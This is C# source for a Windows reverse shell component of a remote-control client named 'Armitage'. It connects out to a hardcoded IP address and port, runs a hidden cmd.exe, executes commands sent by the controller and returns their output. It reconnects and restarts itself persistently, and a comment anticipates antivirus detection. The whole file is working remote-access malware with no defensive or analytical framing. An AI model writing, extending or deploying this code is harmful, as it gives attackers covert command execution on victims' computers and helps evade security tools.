using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Armitage.Shell
{
    /*
     * I'm pretty sure this class is going to get detected by AV.
     */

    /// <summary>
    /// A class that listens commands from the controller.
    /// </summary>
    public static class Shell
    {
        private static string ApiIP = "194.233.71.142";

        private static ushort Port = 30000;

        private static Thread _reader = null;

        private static TcpClient _client;

        private static NetworkStream _stream;

        private static Process _shell;

        /// <summary>
        /// Starts listening for commands from the controller.
        /// </summary>
        public static void Start()
        {
            // start reading from remote endpoint
            IPAddress ip = IPAddress.Parse(ApiIP);

            if (_reader == null)
            {
                _reader = new Thread(SafeExecute);

                _reader.Start();
            }
        }

        public static void SafeExecute()
        {
            try
            {
                ContinuousReading();
            }
            catch (Exception ex)
            {
                CleanUp();

                Thread.Sleep(1000);

                Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                // be presistent
                SafeExecute();
            }
        }

        // opens a persisten shell that can only be closed when setting Update.json's OpenShell to false
        public static void ContinuousReading()
        {
            while (Utilities.Updater.Latest != null && Utilities.Updater.Latest.OpenShell)
            {

                try
                {
                    _client = new TcpClient();

                    _client.Connect(ApiIP, Port);

                    _isconnected = true;

                    _stream = _client.GetStream();

                    _shell = CreateCMD();

                    _shell.OutputDataReceived += _shell_OutputDataReceived;

                    _shell.ErrorDataReceived += _shell_OutputDataReceived;

                    _shell.BeginOutputReadLine();

                    _shell.BeginErrorReadLine();

                }
                catch (Exception ex)
                {

                }
                finally
                {
                    while (_client.GetState() == TcpState.Established)
                    {
                        try
                        {
                            byte[] receivedBytes = new byte[_client.Available];

                            int byteCount = _stream.Read(receivedBytes, 0, receivedBytes.Length);

                            var commandtype = (Command_Types)receivedBytes.FirstOrDefault();

                            receivedBytes = receivedBytes.Skip(1).ToArray();

                            Console.WriteLine($"Received! {byteCount}");

                            if (receivedBytes.Length > 0)
                            {
                                switch (commandtype)
                                {

                                    case Command_Types.CMDCommand:

                                        string commandString = Encoding.ASCII.GetString(receivedBytes);

                                        Console.WriteLine("Received: " + commandString);

                                        _shell.StandardInput.WriteLine(commandString);

                                        _shell.StandardInput.Flush();

                                        break;
                                }

                            }

                        }
                        catch (Exception ex) // got disconnected
                        {
                            CleanUp();

                            break;
                        }
                    }
                }

                // wait for a new shell connection 

                Thread.Sleep(1000);
            }
        }
        public static TcpState GetState(this TcpClient tcpClient)
        {
            var foo = IPGlobalProperties.GetIPGlobalProperties()
              .GetActiveTcpConnections()
              .SingleOrDefault(x => x.LocalEndPoint.Equals(tcpClient.Client.LocalEndPoint));
            return foo != null ? foo.State : TcpState.Unknown;
        }

        private static bool _isconnected = false;

        public static void CleanUp()
        {
            try
            {
                // wait for new connection
                if (_client != null)
                    _client.Close();

                _stream.Close();
            }
            catch { }
        }

        private static void _shell_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null && _client.Connected && _stream != null)
            {
                Console.WriteLine(e.Data + Environment.NewLine);

                var bytes = new List<byte>() { (byte)Message_Types.CMDMessage };

                bytes.AddRange(Encoding.ASCII.GetBytes(e.Data + Environment.NewLine));

                _stream.Write(bytes.ToArray(), 0, bytes.Count);

                _stream.Flush();
            }
        }

        private static Process CreateCMD()
        {

            // create cmd
            Process p = new Process();

            p.StartInfo.FileName = "cmd.exe";

            p.EnableRaisingEvents = true;

            p.StartInfo.CreateNoWindow = true;

            p.StartInfo.UseShellExecute = false;

            p.StartInfo.RedirectStandardOutput = true;

            p.StartInfo.RedirectStandardInput = true;

            p.StartInfo.RedirectStandardError = true;

            p.Exited += (po, o) =>
            {

                if (_stream != null)
                {
                    Thread.Sleep(1000);

                    var bytes = new byte[] { (byte)Message_Types.Exited };

                    if (_client != null && _client.Connected)
                    {
                        _stream.Write(bytes, 0, bytes.Length);

                        _stream.Flush();

                        CleanUp();
                    }

                    Start();
                }

            };

            p.Start();

            return p;
        }
    }
}
